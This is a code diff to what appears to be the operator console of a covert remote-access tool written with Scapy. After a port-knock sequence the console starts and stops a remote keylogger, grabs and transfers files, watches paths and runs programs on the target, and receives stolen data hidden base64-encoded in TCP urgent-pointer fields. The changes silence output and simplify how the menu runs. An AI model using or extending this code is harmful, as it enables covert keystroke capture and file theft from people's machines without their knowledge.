@@ -1,11 +1,13 @@
 import os
 import base64
 import threading
-from scapy.all import sniff, TCP, send, IP, Raw
+from scapy.all import sniff, TCP, send, IP, Raw, conf
 import sys
 import socket
 import time
-import subprocess
+
+# Disable Scapy verbose mode
+conf.verb = 0
 
 eof_signal = 65535  # End of file signal
 received_data = ""
@@ -45,7 +47,7 @@ def stop_keylogger():
     current_signal = "KL_STOP"
     send_signal("KL_STOP")
     print("Keylogger stopped. Waiting for log file...")
-    start_sniffing()
+    start_sniffing(False)
 
 def start_file_transfer(file_path):
     """Start the file transfer by sending the file transfer signal."""
@@ -91,13 +93,13 @@ def packet_callback(packet):
         urgent_pointer_chunk = urgent_pointer_value.to_bytes(2, 'big').decode(errors='ignore')
         received_data += urgent_pointer_chunk
 
-        print(f"Received Urgent Pointer: {urgent_pointer_value}")
-        print(f"Received Data Chunk: {urgent_pointer_chunk}")
+        #print(f"Received Urgent Pointer: {urgent_pointer_value}")
+        #print(f"Received Data Chunk: {urgent_pointer_chunk}")
 
         try:
             padded_data = received_data + '=' * ((4 - len(received_data) % 4) % 4)
             decoded_data = base64.b64decode(padded_data).decode(errors='ignore')
-            print(f"Decoded Data: {decoded_data}")
+            #print(f"Decoded Data: {decoded_data}")
             if urgent_pointer_value == eof_signal:
                 print("EOF signal detected.")
                 if current_signal == "RUN":
@@ -106,19 +108,25 @@ def packet_callback(packet):
                     save_file(decoded_data)
                 current_signal = None  # Reset current_signal after handling
                 received_data = ""  # Reset received_data after handling
+                # exit thread if EOF is detected
+                sniffing_event.set()
         except (UnicodeDecodeError, base64.binascii.Error) as e:
-            print(f"Decoding error: {e}")
+            # ignore decoding errors and continue
+            pass
 
-def start_sniffing():
+def start_sniffing(threaded=True):
     """Start sniffing for packets."""
     global sniffing, sniff_thread
     sniffing = True
     sniffing_event.clear()
     local_ip = get_local_ip()
-    print("Waiting for signal...")
-    if not sniff_thread or not sniff_thread.is_alive():
-        sniff_thread = threading.Thread(target=sniff_packets, args=(local_ip,))
-        sniff_thread.start()
+    print("Waiting for response...")
+    if threaded:
+        if not sniff_thread or not sniff_thread.is_alive():
+            sniff_thread = threading.Thread(target=sniff_packets, args=(local_ip,))
+            sniff_thread.start()
+    else:
+        sniff_packets(local_ip)
 
 def sniff_packets(local_ip):
     """Sniff packets in a separate thread."""
@@ -247,14 +255,6 @@ def display_menu():
     print("6. Run Program")
     print("7. Exit")
     print("8. Uninstall")
-    print("\nOutput:")
-
-def run_in_new_terminal(command):
-    """Run a command in a new terminal window."""
-    if os.name == 'nt':  # Windows
-        subprocess.Popen(['start', 'cmd', '/k', command], shell=True)
-    else:  # Linux/Mac
-        subprocess.Popen(['x-terminal-emulator', '-e', command])
 
 def main():
     """Main function to handle user input and execute corresponding actions."""
@@ -278,27 +278,27 @@ def main():
     send_knock_sequence(dest_ip, knock_sequence)
 
     options = {
-        "1": lambda: run_in_new_terminal("python -c \"from dashboard import start_keylogger; start_keylogger()\""),
-        "2": lambda: run_in_new_terminal("python -c \"from dashboard import stop_keylogger; stop_keylogger()\""),
-        "3": lambda: run_in_new_terminal(f"python -c \"from dashboard import start_file_transfer; start_file_transfer('{input('Enter the file path to transfer: ')}')\""),
-        "4": lambda: run_in_new_terminal(f"python -c \"from dashboard import start_file_grabber; start_file_grabber('{input('Enter the file path to receive: ')}')\""),
-        "5": lambda: run_in_new_terminal(f"python -c \"from dashboard import start_watcher; start_watcher('{input('Enter the file or directory to watch: ')}')\""),
-        "6": lambda: run_in_new_terminal(f"python -c \"from dashboard import start_runner; start_runner('{input('Enter the program to run: ')}')\""),
-        "7": lambda: run_in_new_terminal("python -c \"from dashboard import close_connection; close_connection()\""),
-        "8": lambda: run_in_new_terminal("python -c \"from dashboard import uninstall; uninstall()\""),
+        "1": lambda: start_keylogger(),
+        "2": lambda: stop_keylogger(),
+        "3": lambda: start_file_transfer(input("Enter the file path to transfer: ")),
+        "4": lambda: start_file_grabber(input("Enter the file path to receive: ")),
+        "5": lambda: start_watcher(input("Enter the file or directory to watch: ")),
+        "6": lambda: start_runner(input("Enter the program to run: ")),
+        "7": lambda: close_connection(),
+        "8": lambda: uninstall(),
     }
 
     while True:
-        clear_screen()  # Clear the terminal screen
         display_menu()  # Display the menu at the top
-
         choice = input("Enter your choice: ")
 
         if choice in options:
-            options[choice]()
+            options[choice]()  # Execute the selected option
         else:
             print("Invalid choice.")
             time.sleep(1)  # Pause briefly to allow the user to see the message
+
+        #clear_screen()  # Clear the terminal screen after the option is executed
 
 if __name__ == "__main__":
     main()
